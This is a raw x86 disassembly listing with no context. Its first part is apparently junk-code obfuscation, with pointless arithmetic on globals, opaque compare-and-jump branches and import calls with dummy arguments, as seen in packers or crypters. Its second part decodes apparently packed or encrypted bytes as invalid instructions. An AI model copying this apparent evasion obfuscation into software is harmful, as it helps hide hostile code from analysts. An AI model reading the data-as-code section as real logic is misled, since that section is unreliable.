  41b51b:	push   DWORD PTR [ebp-0x10]
  41b51e:	push   DWORD PTR [ebp-0x10]
  41b521:	push   0x8dff
  41b526:	push   DWORD PTR [ebp-0x18]
  41b529:	push   0x428515
  41b52e:	call   DWORD PTR ds:0x42e290
  41b534:	xor    ecx,0x4175
  41b53a:	movzx  ecx,BYTE PTR ds:0x428409
  41b541:	or     ecx,DWORD PTR ds:0x4283cd
  41b547:	mov    DWORD PTR ds:0x428409,ecx
  41b54d:	add    DWORD PTR ds:0x4283a9,edx
  41b553:	adc    ecx,0x68aa
  41b559:	add    DWORD PTR ds:0x4282f1,0x591d
  41b563:	dec    DWORD PTR ds:0x428421
  41b569:	mov    DWORD PTR [ebp-0x50],0x1
  41b570:	cmp    DWORD PTR ds:0x42851d,0x0
  41b577:	not    ecx
  41b579:	mov    DWORD PTR ds:0x428301,0x24a
  41b583:	jmp    0x41b5df
  41b588:	mov    DWORD PTR ds:0x428309,0x4cf4
  41b592:	mov    eax,0x7057
  41b597:	cmp    DWORD PTR ds:0x42851d,0x0
  41b59e:	jl     0x41b5c3
  41b5a4:	push   DWORD PTR [ebp-0xc]
  41b5a7:	call   DWORD PTR ds:0x42e10c
  41b5ad:	adc    ecx,DWORD PTR ds:0x4283cd
  41b5b3:	sbb    DWORD PTR ds:0x4283f1,0x4277
  41b5bd:	and    DWORD PTR ds:0x428475,ecx
  41b5c3:	and    ecx,ecx
  41b5c5:	or     DWORD PTR ds:0x428415,0x5b0f
  41b5cf:	sbb    ecx,0x33b5
  41b5d5:	sub    DWORD PTR ds:0x4283ed,0xb05
  41b5df:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41b5e9:	xor    DWORD PTR ds:0x428309,0x1f8b
  41b5f3:	mov    DWORD PTR [ebp-0xb8],0x1
  41b5fd:	mov    ecx,DWORD PTR [ebp-0xb8]
  41b603:	mov    eax,0x584
  41b608:	xor    edx,edx
  41b60a:	div    ecx
  41b60c:	cmp    DWORD PTR ds:0x4284a1,0x0
  41b613:	mov    DWORD PTR ds:0x428305,0x2b7a
  41b61d:	mov    DWORD PTR ds:0x4284ed,0x6434
  41b627:	mov    DWORD PTR ds:0x428475,0x53bf
  41b631:	jmp    0x41b6a4
  41b636:	mov    DWORD PTR ds:0x4283e5,edi
  41b63c:	movzx  ecx,WORD PTR ds:0x428301
  41b643:	cmp    DWORD PTR ds:0x4284a1,0x0
  41b64a:	jle    0x41b684
  41b650:	push   0x4283cd
  41b655:	push   0x428409
  41b65a:	push   0x4283a5
  41b65f:	call   DWORD PTR ds:0x42e294
  41b665:	xor    DWORD PTR ds:0x428485,edi
  41b66b:	movzx  ecx,BYTE PTR ds:0x4282e1
  41b672:	sub    ecx,DWORD PTR ds:0x4283e9
  41b678:	mov    DWORD PTR ds:0x4282e1,ecx
  41b67e:	adc    DWORD PTR ds:0x4283e1,ecx
  41b684:	adc    ecx,0x4862
  41b68a:	and    ecx,DWORD PTR ds:0x4283e1
  41b690:	or     DWORD PTR ds:0x428485,ecx
  41b696:	mov    ecx,DWORD PTR ds:0x428461
  41b69c:	mov    ecx,DWORD PTR [ecx]
  41b69e:	sub    DWORD PTR ds:0x428409,ecx
  41b6a4:	imul   eax,eax,0x51d4
  41b6aa:	sub    ecx,0x11f6
  41b6b0:	mov    ecx,DWORD PTR [ebp-0xbc]
  41b6b6:	add    DWORD PTR ds:0x4283cd,0x5690
  41b6c0:	xor    eax,ecx
  41b6c2:	adc    DWORD PTR ds:0x428505,edi
  41b6c8:	and    eax,0x4c09
  41b6cd:	sbb    ecx,0x3053
  41b6d3:	mov    ecx,DWORD PTR [ebp-0x50]
  41b6d6:	sub    DWORD PTR ds:0x4283c9,0x428419
  41b6e0:	xor    edx,edx
  41b6e2:	div    ecx
  41b6e4:	sbb    ecx,DWORD PTR ds:0x4283c5
  41b6ea:	sub    eax,0x401
  41b6ef:	mov    ecx,DWORD PTR ds:0x4284a1
  41b6f5:	sub    DWORD PTR ds:0x428511,ecx
  41b6fb:	mov    DWORD PTR [ebp-0x90],eax
  41b701:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41b70b:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41b712:	cmp    DWORD PTR ds:0x428415,0x0
  41b719:	mov    DWORD PTR ds:0x4282f9,0x12e0
  41b723:	movzx  edx,WORD PTR ds:0x4283d9
  41b72a:	jmp    0x41b78a
  41b72f:	not    eax
  41b731:	mov    DWORD PTR ds:0x428475,edi
  41b737:	cmp    DWORD PTR ds:0x428415,0x0
  41b73e:	jne    0x41b768
  41b744:	push   0x4280f7
  41b749:	call   DWORD PTR ds:0x42e298
  41b74f:	movzx  edx,WORD PTR ds:0x4282ed
  41b756:	xor    DWORD PTR ds:0x4282d1,edx
  41b75c:	and    ecx,0x442f
  41b762:	sub    edx,0x55c5
  41b768:	mov    ecx,DWORD PTR ds:0x42847d
  41b76e:	xor    ecx,DWORD PTR ds:0x428485
  41b774:	mov    DWORD PTR ds:0x42847d,ecx
  41b77a:	and    DWORD PTR ds:0x4282fd,0x34b7
  41b784:	adc    DWORD PTR ds:0x4284a1,ebx
  41b78a:	mov    DWORD PTR [ebp-0xb4],0x3842
  41b794:	adc    ecx,edx
  41b796:	mov    eax,DWORD PTR [ebp-0x4c]
  41b799:	and    ecx,edx
  41b79b:	add    eax,DWORD PTR [ebp-0xb4]
  41b7a1:	xor    eax,0x2e02
  41b7a6:	add    ecx,ecx
  41b7a8:	xor    eax,0x7294
  41b7ad:	add    ecx,ecx
  41b7af:	imul   eax,eax,0x68f3
  41b7b5:	mov    ecx,DWORD PTR [ebp-0x8c]
  41b7bb:	cmp    DWORD PTR ds:0x428301,0x0
  41b7c2:	mov    DWORD PTR ds:0x428409,ebx
  41b7c8:	mov    edx,DWORD PTR ds:0x42851d
  41b7ce:	jmp    0x41b822
  41b7d3:	mov    DWORD PTR ds:0x4282f5,edx
  41b7d9:	cmp    DWORD PTR ds:0x428301,0x0
  41b7e0:	ja     0x41b810
  41b7e6:	push   DWORD PTR [ebp-0x1c]
  41b7e9:	push   0x2a61
  41b7ee:	push   0x6c90
  41b7f3:	push   0x2be6
  41b7f8:	push   0x2810
  41b7fd:	call   DWORD PTR ds:0x42e054
  41b803:	inc    edx
  41b804:	mov    edx,DWORD PTR ds:0x4282f1
  41b80a:	sbb    DWORD PTR ds:0x4283f9,edx
  41b810:	or     edx,DWORD PTR ds:0x428311
  41b816:	and    edx,DWORD PTR ds:0x428475
  41b81c:	sub    edx,DWORD PTR ds:0x428509
  41b822:	and    eax,ecx
  41b824:	adc    DWORD PTR ds:0x42840d,0x2bc9
  41b82e:	sub    eax,0x2818
  41b833:	mov    edx,DWORD PTR ds:0x4284bd
  41b839:	mov    ecx,DWORD PTR ds:0x4284c9
  41b83f:	sub    ecx,edx
  41b841:	add    edx,DWORD PTR [edx+ecx*1]
  41b844:	mov    DWORD PTR [ebp-0xe8],eax
  41b84a:	mov    DWORD PTR [ebp-0x70],0x6f89
  41b851:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41b85b:	mov    DWORD PTR [ebp-0x120],0x3c77
  41b865:	sbb    DWORD PTR ds:0x4283c9,edx
  41b86b:	mov    DWORD PTR [ebp-0x2c],0x2129
  41b872:	cmp    DWORD PTR ds:0x428421,0x0
  41b879:	mov    DWORD PTR ds:0x428315,0x25cb
  41b883:	mov    edx,0x2db2
  41b888:	mov    DWORD PTR ds:0x4284a1,0x75fd
  41b892:	jmp    0x41b8de
  41b897:	mov    eax,0x420d
  41b89c:	mov    DWORD PTR ds:0x42847d,0x38f0
  41b8a6:	cmp    DWORD PTR ds:0x428421,0x0
  41b8ad:	jge    0x41b8c8
  41b8b3:	push   DWORD PTR [ebp-0xc]
  41b8b6:	call   DWORD PTR ds:0x42e058
  41b8bc:	adc    DWORD PTR ds:0x4284ed,edx
  41b8c2:	add    DWORD PTR ds:0x428511,edx
  41b8c8:	sbb    edx,DWORD PTR ds:0x428505
  41b8ce:	and    DWORD PTR ds:0x42846d,0x10d1
  41b8d8:	and    ecx,0x7be2
  41b8de:	mov    eax,DWORD PTR [ebp-0x2c]
  41b8e1:	imul   eax,eax,0x1ada
  41b8e7:	xor    DWORD PTR ds:0x428409,ebx
  41b8ed:	mov    ecx,DWORD PTR [ebp-0x120]
  41b8f3:	mov    edx,DWORD PTR ds:0x4283b5
  41b8f9:	or     edx,DWORD PTR ds:0x428401
  41b8ff:	mov    DWORD PTR ds:0x4283b5,edx
  41b905:	imul   ecx,ecx,0x53ae
  41b90b:	xor    DWORD PTR ds:0x428475,0x220b
  41b915:	imul   ecx,ecx,0x7447
  41b91b:	mov    edx,DWORD PTR [ebp-0xd0]
  41b921:	and    ecx,edx
  41b923:	or     ecx,0x2a20
  41b929:	or     DWORD PTR ds:0x428475,0x6762
  41b933:	mov    edx,DWORD PTR [ebp-0x70]
  41b936:	xor    ecx,edx
  41b938:	and    DWORD PTR ds:0x4282dd,0x71f
  41b942:	mov    edx,DWORD PTR [ebp+0x14]
  41b945:	or     DWORD PTR ds:0x4283f1,0x17f4
  41b94f:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41b956:	or     DWORD PTR ds:0x428491,0x428421
  41b960:	lea    eax,[ecx+eax*1-0x45a1]
  41b967:	mov    DWORD PTR [ebp-0xb0],eax
  41b96d:	add    ecx,eax
  41b96f:	mov    DWORD PTR [ebp-0x11c],0x303f
  41b979:	mov    DWORD PTR [ebp-0x98],0x51a9
  41b983:	sub    ecx,eax
  41b985:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41b98f:	cmp    DWORD PTR ds:0x428315,0x0
  41b996:	mov    DWORD PTR ds:0x4282f9,0x245f
  41b9a0:	mov    ecx,DWORD PTR ds:0x4283cd
  41b9a6:	mov    ecx,0x273f
  41b9ab:	jmp    0x41ba0f
  41b9b0:	mov    DWORD PTR ds:0x428409,ebx
  41b9b6:	mov    DWORD PTR ds:0x4283d9,0x963
  41b9c0:	cmp    DWORD PTR ds:0x428315,0x0
  41b9c7:	jle    0x41b9ee
  41b9cd:	push   DWORD PTR [ebp-0x28]
  41b9d0:	push   0x42846d
  41b9d5:	push   0x428155
  41b9da:	call   DWORD PTR ds:0x42e29c
  41b9e0:	sub    DWORD PTR ds:0x4284fd,ebx
  41b9e6:	xor    ecx,ecx
  41b9e8:	sbb    DWORD PTR ds:0x428485,ebx
  41b9ee:	movzx  ecx,BYTE PTR ds:0x4282fd
  41b9f5:	adc    DWORD PTR ds:0x4283e9,ecx
  41b9fb:	add    DWORD PTR ds:0x4282f1,0x7cea
  41ba05:	sbb    DWORD PTR ds:0x4282f5,0x6b1e
  41ba0f:	mov    eax,DWORD PTR [ebp-0xcc]
  41ba15:	xor    eax,0x6f65
  41ba1a:	cmp    DWORD PTR ds:0x4282ed,0x0
  41ba21:	mov    DWORD PTR ds:0x4283e5,edx
  41ba27:	mov    ecx,0x51b5
  41ba2c:	jmp    0x41baa2
  41ba31:	mov    DWORD PTR ds:0x4283ed,0xb0f
  41ba3b:	cmp    DWORD PTR ds:0x4282ed,0x0
  41ba42:	jl     0x41ba7a
  41ba48:	push   0x200e
  41ba4d:	push   0x21c1
  41ba52:	push   DWORD PTR [ebp-0x14]
  41ba55:	push   DWORD PTR [ebp-0x14]
  41ba58:	call   DWORD PTR ds:0x42e110
  41ba5e:	sub    DWORD PTR ds:0x4283b9,ecx
  41ba64:	sub    ecx,DWORD PTR ds:0x4284e5
  41ba6a:	sbb    DWORD PTR ds:0x4283c1,0x42849d
  41ba74:	sub    ecx,0x1dd7
  41ba7a:	mov    ecx,DWORD PTR ds:0x428405
  41ba80:	adc    ecx,DWORD PTR ds:0x428519
  41ba86:	mov    DWORD PTR ds:0x428405,ecx
  41ba8c:	adc    DWORD PTR ds:0x428509,0x3dd1
  41ba96:	mov    DWORD PTR ds:0x428309,0x5b91
  41baa0:	neg    ecx
  41baa2:	mov    ecx,DWORD PTR [ebp-0x98]
  41baa8:	add    DWORD PTR ds:0x428515,0x72a
  41bab2:	or     eax,ecx
  41bab4:	xor    DWORD PTR ds:0x428409,ebx
  41baba:	add    eax,0x161e
  41babf:	sub    ecx,0x1ef7
  41bac5:	mov    ecx,DWORD PTR [ebp-0x11c]
  41bacb:	or     eax,ecx
  41bacd:	cmp    DWORD PTR ds:0x4283b9,0x0
  41bad4:	mov    ecx,DWORD PTR ds:0x4283d1
  41bada:	mov    DWORD PTR ds:0x4283f5,0x4d
  41bae4:	jmp    0x41bbad
  41bae9:	mov    DWORD PTR ds:0x4283f5,0x133b
  41baf3:	cmp    DWORD PTR ds:0x4283b9,0x0
  41bafa:	jne    0x41bb25
  41bb00:	push   0x428501
  41bb05:	push   0x8a51
  41bb0a:	push   0x81dc
  41bb0f:	call   DWORD PTR ds:0x42e05c
  41bb15:	and    DWORD PTR ds:0x4283cd,0x4030
  41bb1f:	sub    DWORD PTR ds:0x428479,edx
  41bb25:	add    ecx,0x753f
  41bb2b:	mov    ecx,DWORD PTR ds:0x4283b5
  41bb31:	xor    DWORD PTR ds:0x4283b1,ecx
  41bb37:	sbb    DWORD PTR ds:0x4284fd,edx
  41bb3d:	cmp    DWORD PTR ds:0x428511,0x0
  41bb44:	mov    ecx,DWORD PTR ds:0x428515
  41bb4a:	mov    ecx,DWORD PTR ds:0x428491
  41bb50:	mov    DWORD PTR ds:0x42840d,edx
  41bb56:	mov    DWORD PTR ds:0x4283c5,edi
  41bb5c:	jmp    0x41bbad
  41bb61:	not    ecx
  41bb63:	cmp    DWORD PTR ds:0x428511,0x0
  41bb6a:	jne    0x41bb96
  41bb70:	push   0x6108
  41bb75:	push   0x2ee0
  41bb7a:	push   0x428235
  41bb7f:	push   0x1382
  41bb84:	call   DWORD PTR ds:0x42e060
  41bb8a:	or     DWORD PTR ds:0x428469,edi
  41bb90:	neg    DWORD PTR ds:0x4282f5
  41bb96:	movzx  ecx,WORD PTR ds:0x4284f9
  41bb9d:	sbb    DWORD PTR ds:0x428411,ecx
  41bba3:	or     DWORD PTR ds:0x4283e5,0x4283f1
  41bbad:	add    eax,0x1cca
  41bbb2:	cmp    DWORD PTR ds:0x4282f1,0x0
  41bbb9:	mov    DWORD PTR ds:0x4283f1,0x3c56
  41bbc3:	mov    ecx,0x7f6d
  41bbc8:	mov    ecx,DWORD PTR ds:0x4283ed
  41bbce:	jmp    0x41bc28
  41bbd3:	not    ecx
  41bbd5:	cmp    DWORD PTR ds:0x4282f1,0x0
  41bbdc:	jbe    0x41bc10
  41bbe2:	push   0x5de5
  41bbe7:	push   0x42821f
  41bbec:	push   0x27d6
  41bbf1:	call   DWORD PTR ds:0x42e114
  41bbf7:	movzx  ecx,BYTE PTR ds:0x428311
  41bbfe:	adc    DWORD PTR ds:0x428305,ecx
  41bc04:	sbb    ecx,0x4cc7
  41bc0a:	sbb    ecx,DWORD PTR ds:0x4283ed
  41bc10:	adc    DWORD PTR ds:0x428519,ebx
  41bc16:	mov    ecx,DWORD PTR ds:0x4282dd
  41bc1c:	sub    DWORD PTR ds:0x428521,ecx
  41bc22:	add    ecx,0x5653
  41bc28:	xor    eax,0x96c9
  41bc2d:	sbb    DWORD PTR ds:0x428519,0x433e
  41bc37:	mov    DWORD PTR [ebp-0x38],eax
  41bc3a:	mov    DWORD PTR [ebp-0x118],0x6083
  41bc44:	sub    DWORD PTR ds:0x4282cd,0x67a3
  41bc4e:	mov    DWORD PTR [ebp-0x88],0x556
  41bc58:	or     ecx,eax
  41bc5a:	mov    DWORD PTR [ebp-0x140],0x6c7d
  41bc64:	cmp    DWORD PTR ds:0x428471,0x0
  41bc6b:	mov    ecx,0x31c9
  41bc70:	mov    DWORD PTR ds:0x428519,0x1996
  41bc7a:	jmp    0x41bccd
  41bc7f:	mov    DWORD PTR ds:0x42846d,edi
  41bc85:	cmp    DWORD PTR ds:0x428471,0x0
  41bc8c:	jb     0x41bcb3
  41bc92:	push   0x428293
  41bc97:	push   DWORD PTR [ebp-0x14]
  41bc9a:	call   DWORD PTR ds:0x42e118
  41bca0:	add    ecx,DWORD PTR ds:0x4283f5
  41bca6:	movzx  ecx,BYTE PTR ds:0x428419
  41bcad:	add    DWORD PTR ds:0x428305,ecx
  41bcb3:	sub    DWORD PTR ds:0x428475,ecx
  41bcb9:	xor    ecx,ecx
  41bcbb:	add    ecx,DWORD PTR ds:0x4283a9
  41bcc1:	or     DWORD PTR ds:0x4284e9,ecx
  41bcc7:	add    DWORD PTR ds:0x4283b1,ebx
  41bccd:	mov    eax,DWORD PTR [ebp-0x140]
  41bcd3:	add    eax,0x5af8
  41bcd8:	sbb    ecx,0x75c4
  41bcde:	mov    ecx,DWORD PTR [ebp-0x88]
  41bce4:	sub    eax,ecx
  41bce6:	mov    ecx,DWORD PTR [ebp-0x118]
  41bcec:	xor    DWORD PTR ds:0x428505,0x6d4
  41bcf6:	lea    eax,[eax+ecx*1+0x68dc]
  41bcfd:	or     eax,0x52f6
  41bd02:	cmp    DWORD PTR ds:0x4283f9,0x0
  41bd09:	mov    DWORD PTR ds:0x4284e5,0x1421
  41bd13:	mov    DWORD PTR ds:0x428421,0x487c
  41bd1d:	mov    ecx,DWORD PTR ds:0x4283d5
  41bd23:	jmp    0x41bd91
  41bd28:	mov    DWORD PTR ds:0x4283ed,0x10ed
  41bd32:	not    ecx
  41bd34:	cmp    DWORD PTR ds:0x4283f9,0x0
  41bd3b:	jbe    0x41bd77
  41bd41:	push   0x8eb3
  41bd46:	call   DWORD PTR ds:0x42e11c
  41bd4c:	mov    ecx,DWORD PTR ds:0x428475
  41bd52:	sub    DWORD PTR ds:0x428301,ecx
  41bd58:	mov    ecx,DWORD PTR ds:0x4283d1
  41bd5e:	sbb    ecx,DWORD PTR ds:0x428401
  41bd64:	mov    DWORD PTR ds:0x4283d1,ecx
  41bd6a:	movzx  ecx,BYTE PTR ds:0x4282ed
  41bd71:	or     DWORD PTR ds:0x428465,ecx
  41bd77:	sbb    DWORD PTR ds:0x4282e5,ebx
  41bd7d:	neg    ecx
  41bd7f:	mov    ecx,DWORD PTR ds:0x4282f5
  41bd85:	xor    ecx,DWORD PTR ds:0x4283a9
  41bd8b:	mov    DWORD PTR ds:0x4282f5,ecx
  41bd91:	sub    eax,0x1dbfe
  41bd96:	sbb    DWORD PTR ds:0x428489,ecx
  41bd9c:	mov    DWORD PTR [ebp-0xac],eax
  41bda2:	xor    DWORD PTR ds:0x4283cd,ebx
  41bda8:	mov    DWORD PTR [ebp-0x6c],0x4b56
  41bdaf:	mov    DWORD PTR [ebp-0x100],0x49f7
  41bdb9:	inc    ecx
  41bdba:	mov    eax,DWORD PTR [ebp-0x100]
  41bdc0:	movzx  ecx,BYTE PTR ds:0x4284f5
  41bdc7:	sub    ecx,DWORD PTR ds:0x428469
  41bdcd:	mov    DWORD PTR ds:0x4284f5,ecx
  41bdd3:	add    eax,0x7b60
  41bdd8:	sbb    ecx,0x7111
  41bdde:	imul   eax,eax,0x5ea
  41bde4:	add    DWORD PTR ds:0x428415,ecx
  41bdea:	mov    ecx,DWORD PTR [ebp-0x6c]
  41bded:	imul   eax,ecx
  41bdf0:	xor    edx,edx
  41bdf2:	adc    DWORD PTR ds:0x4283b1,0x2190
  41bdfc:	mov    ecx,0x3218d
  41be01:	div    ecx
  41be03:	sub    eax,0x24c1
  41be08:	sbb    ecx,0x10cc
  41be0e:	mov    DWORD PTR [ebp-0xa8],eax
  41be14:	xor    eax,eax
  41be16:	add    eax,DWORD PTR ds:0x42847d
  41be1c:	sbb    eax,DWORD PTR ds:0x428415
  41be22:	mov    ds:0x42847d,eax
  41be27:	mov    DWORD PTR [ebp-0x84],0x2c40
  41be31:	xor    ecx,ecx
  41be33:	or     ecx,DWORD PTR ds:0x4283b1
  41be39:	xor    ecx,DWORD PTR ds:0x428411
  41be3f:	mov    DWORD PTR ds:0x4283b1,ecx
  41be45:	mov    DWORD PTR [ebp-0x18],0x6013
  41be4c:	or     DWORD PTR ds:0x4284f9,ecx
  41be52:	mov    DWORD PTR [ebp-0x80],0xc
  41be59:	and    eax,eax
  41be5b:	mov    eax,DWORD PTR [ebp-0x18]
  41be5e:	and    DWORD PTR ds:0x428465,edi
  41be64:	mov    ecx,DWORD PTR [ebp-0x80]
  41be67:	xor    edx,edx
  41be69:	add    DWORD PTR ds:0x42830d,0x428301
  41be73:	div    ecx
  41be75:	imul   eax,eax,0x4312
  41be7b:	cmp    DWORD PTR ds:0x428481,0x0
  41be82:	mov    DWORD PTR ds:0x4283b1,0x6e4f
  41be8c:	movzx  ecx,WORD PTR ds:0x428519
  41be93:	mov    DWORD PTR ds:0x4284f5,edi
  41be99:	jmp    0x41befc
  41be9e:	mov    DWORD PTR ds:0x4282dd,0x5f09
  41bea8:	cmp    DWORD PTR ds:0x428481,0x0
  41beaf:	jge    0x41bed8
  41beb5:	push   DWORD PTR [ebp-0x28]
  41beb8:	call   DWORD PTR ds:0x42e064
  41bebe:	sbb    ecx,DWORD PTR ds:0x42846d
  41bec4:	xor    ecx,ecx
  41bec6:	xor    ecx,DWORD PTR ds:0x4283d1
  41becc:	sub    DWORD PTR ds:0x428305,ecx
  41bed2:	and    DWORD PTR ds:0x4283d9,edi
  41bed8:	xor    ecx,ecx
  41beda:	xor    ecx,DWORD PTR ds:0x428509
  41bee0:	xor    DWORD PTR ds:0x4283a5,ecx
  41bee6:	or     DWORD PTR ds:0x4283e5,0x15e9
  41bef0:	xor    ecx,0x6843
  41bef6:	adc    ecx,DWORD PTR ds:0x4283e9
  41befc:	add    eax,0x5abe
  41bf01:	mov    ecx,DWORD PTR [ebp-0x84]
  41bf07:	add    DWORD PTR ds:0x428481,0x428519
  41bf11:	xor    eax,ecx
  41bf13:	mov    ecx,DWORD PTR ds:0x4282f9
  41bf19:	and    ecx,DWORD PTR ds:0x4284fd
  41bf1f:	mov    DWORD PTR ds:0x4282f9,ecx
  41bf25:	xor    edx,edx
  41bf27:	not    DWORD PTR ds:0x428309
  41bf2d:	mov    ecx,0x5ae
  41bf32:	div    ecx
  41bf34:	jmp    0x41c31b
  41bf39:	xchg   DWORD PTR [edi],esp
  41bf3b:	dec    eax
  41bf3c:	in     al,0x68
  41bf3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf3f:	lods   al,BYTE PTR ds:[esi]
  41bf40:	stos   DWORD PTR es:[edi],eax
  41bf41:	test   BYTE PTR [ebx+eax*8+0x64cedccf],bh
  41bf48:	sahf   
  41bf49:	aam    0x3b
  41bf4b:	sar    BYTE PTR [esi-0x41413bb6],0xdf
  41bf52:	cmp    al,0x51
  41bf54:	mov    edx,esp
  41bf56:	xor    BYTE PTR [edx],dl
  41bf58:	or     al,0x4b
  41bf5a:	hlt    
  41bf5b:	(bad)  
  41bf5c:	(bad)
  41bf60:	cmc    
  41bf61:	lahf   
  41bf62:	or     dh,BYTE PTR ds:0x58115e0c
  41bf68:	pop    ebx
  41bf69:	xchg   esp,eax
  41bf6a:	mov    ebx,0x9fa5e438
  41bf6f:	or     edx,DWORD PTR [esi-0x748253c5]
  41bf75:	jle    0x41bf84
  41bf77:	xor    eax,0x2d85bb7c
  41bf7c:	popa   
  41bf7d:	inc    edi
  41bf7e:	outs   dx,BYTE PTR ds:[esi]
  41bf7f:	and    BYTE PTR [edx],ah
  41bf81:	adc    DWORD PTR [edi-0x401085d],ebx
  41bf87:	dec    ebx
  41bf88:	inc    edx
  41bf89:	inc    ebp
  41bf8a:	jno    0x41bf64
  41bf8c:	add    eax,0xef9103bb
  41bf91:	out    dx,eax
  41bf92:	xor    eax,0xab05411
  41bf97:	jecxz  0x41bf71
  41bf99:	jne    0x41bff4
  41bf9b:	mov    edi,0xf0d6227
  41bfa0:	retf   
  41bfa1:	push   es
  41bfa2:	test   ebx,edi
  41bfa4:	test   eax,0x9773b4
  41bfa9:	dec    edx
  41bfaa:	int3   
  41bfab:	mov    ds:0x30283e9,al
  41bfb0:	jmp    0xde88a40d
  41bfb5:	jg     0x41bfda
  41bfb7:	mov    ebx,0xf32b079a
  41bfbc:	dec    esi
  41bfbd:	les    ebp,FWORD PTR [edx+0x4a7c88d3]
  41bfc3:	mov    bh,0x1
  41bfc5:	shl    eax,0x6a
  41bfc8:	iret   
  41bfc9:	jmp    0x416:0x57e1def8
  41bfd0:	repnz mov edx,0xd8f8636a
  41bfd6:	cli    
  41bfd7:	jb     0x41bfca
  41bfd9:	jbe    0x41bf91
  41bfdb:	shl    BYTE PTR [esi-0x71],0x5
  41bfdf:	xor    al,BYTE PTR ds:0x8bb32c3
  41bfe5:	fild   DWORD PTR [ebp+0x1c]
  41bfe8:	test   DWORD PTR [ecx],edx
  41bfea:	not    DWORD PTR [eax]
  41bfec:	aaa    
  41bfed:	arpl   WORD PTR [esi+0x60],sp
  41bff0:	mov    ebx,0x7607e9e4
  41bff5:	jns    0x41bf91
  41bff7:	or     BYTE PTR [ebp+0x6c],ch
  41bffa:	hlt    
  41bffb:	aaa    
  41bffc:	xchg   ebx,eax
  41bffd:	cmp    DWORD PTR [edx],0x6ed7d0f3
  41c003:	adc    al,BYTE PTR [edi]
  41c005:	mov    al,ds:0x597f5a0
  41c00a:	mov    WORD PTR [edx],ss
  41c00c:	dec    edi
  41c00d:	jbe    0x41bfb9
  41c00f:	xchg   esi,eax
  41c010:	enter  0xdbbb,0xba
  41c014:	ja     0x41bfa0
  41c016:	pop    ss
  41c017:	push   esp
  41c018:	add    al,0xc4
  41c01a:	pop    eax
  41c01b:	jmp    0xfc3220c
  41c020:	jmp    0xe9b3:0xc1489932
  41c027:	popf   
  41c028:	stos   DWORD PTR es:[edi],eax
  41c029:	xchg   ebx,eax
  41c02a:	ror    DWORD PTR [edi+0x15980c76],1
  41c030:	push   0x34b89ed2
  41c035:	fwait
  41c036:	push   ebp
  41c037:	pop    es
  41c038:	fcmovne st,st(5)
  41c03a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c03b:	daa    
  41c03c:	push   ecx
  41c03d:	mov    ebx,0x77a8a33
  41c042:	sub    DWORD PTR [ebx+esi*1],edx
  41c045:	into   
  41c046:	sbb    DWORD PTR [edx+esi*2],ecx
  41c049:	cmp    DWORD PTR ds:0x296c92dd,edx
  41c04f:	stos   BYTE PTR es:[edi],al
  41c050:	loopne 0x41bfdd
  41c052:	scas   al,BYTE PTR es:[edi]
  41c053:	dec    esi
  41c054:	dec    esp
  41c055:	out    dx,al
  41c056:	(bad)  
  41c057:	jmp    0x3f64be5a
  41c05c:	add    BYTE PTR [edi+0x4f],al
  41c05f:	mov    DWORD PTR [edi+0xa],esi
  41c062:	adc    al,0x5e
  41c064:	xor    BYTE PTR [edi],ah
  41c066:	mov    esp,0x51bd9264
  41c06b:	stos   DWORD PTR es:[edi],eax
  41c06c:	loop   0x41c014
  41c06e:	test   al,0x9c
  41c070:	fidiv  WORD PTR [edi-0xc]
  41c073:	push   ecx
  41c074:	jns    0x41c05d
  41c076:	pop    ss
  41c077:	loop   0x41c0e4
  41c079:	mov    ebx,0x41c8b278
  41c07e:	hlt    
  41c07f:	xor    al,0x90
  41c081:	or     BYTE PTR [ecx+edi*4-0x1b],0x4b
  41c086:	pop    ds
  41c087:	mov    dh,0x1
  41c089:	xchg   esp,eax
  41c08a:	and    eax,0x38e5f35b
  41c08f:	rcl    DWORD PTR [eax+0x4d4f77b5],cl
  41c095:	fbstp  TBYTE PTR [ebp+0x778e8160]
  41c09b:	push   ds
  41c09c:	nop
  41c09d:	sub    ebp,ecx
  41c09f:	mov    al,ds:0x4c350fb6
  41c0a4:	lods   al,BYTE PTR ds:[esi]
  41c0a5:	dec    esi
  41c0a6:	fild   WORD PTR [ebx+0x1ae8068e]
  41c0ac:	add    BYTE PTR [ecx-0x49],ch
  41c0af:	dec    edx
  41c0b0:	aam    0x15
  41c0b2:	shl    al,0x44
  41c0b5:	sub    DWORD PTR [edx+esi*1+0x44],esp
  41c0b9:	sbb    eax,0xd471f2a2
  41c0be:	inc    esp
  41c0bf:	push   esp
  41c0c0:	add    DWORD PTR [eax+0xd86c29c],0x381e5137
  41c0ca:	aas    
  41c0cb:	cwde   
  41c0cc:	dec    DWORD PTR [ebx-0x11]
  41c0cf:	sbb    ecx,edx
  41c0d1:	fldcw  WORD PTR [eax+0x270ea345]
  41c0d7:	rol    BYTE PTR [esi-0x2dbeeb1],1
  41c0dd:	in     al,dx
  41c0de:	ja     0x41c14a
  41c0e0:	ds inc esp
  41c0e2:	adc    dh,cl
  41c0e4:	iret   
  41c0e5:	(bad)  
  41c0e6:	bound  ebp,QWORD PTR [edx+0x10ea447d]
  41c0ec:	sbb    DWORD PTR [edx+0x49],esp
  41c0ef:	repz dec esp
  41c0f1:	adc    cl,bh
  41c0f3:	adc    eax,0x460968c7
  41c0f8:	xchg   ebp,eax
  41c0f9:	mov    BYTE PTR [edx],dl
  41c0fb:	dec    eax
  41c0fc:	ss mov ch,0xd6
  41c0ff:	adc    al,BYTE PTR [eax]
  41c101:	adc    al,0xc1
  41c103:	mov    edi,eax
  41c105:	bswap  ebx
  41c107:	gs ja  0x41c09a
  41c10a:	xor    edi,eax
  41c10c:	hlt    
  41c10d:	jae    0x41c11d
  41c10f:	xchg   ecx,eax
  41c110:	retf   0xd91a
  41c113:	push   ss
  41c114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c115:	dec    ebx
  41c116:	lea    ebp,[esi+0x3]
  41c119:	(bad)  
  41c11a:	or     BYTE PTR [edx+0x5308f9ba],ch
  41c120:	mul    al
  41c122:	das    
  41c123:	add    eax,0x598e7d21
  41c128:	jmp    0xae81:0x316baba4
  41c12f:	sbb    al,0xb6
  41c131:	add    BYTE PTR [eax+ebx*1-0x5c],al
  41c135:	out    dx,eax
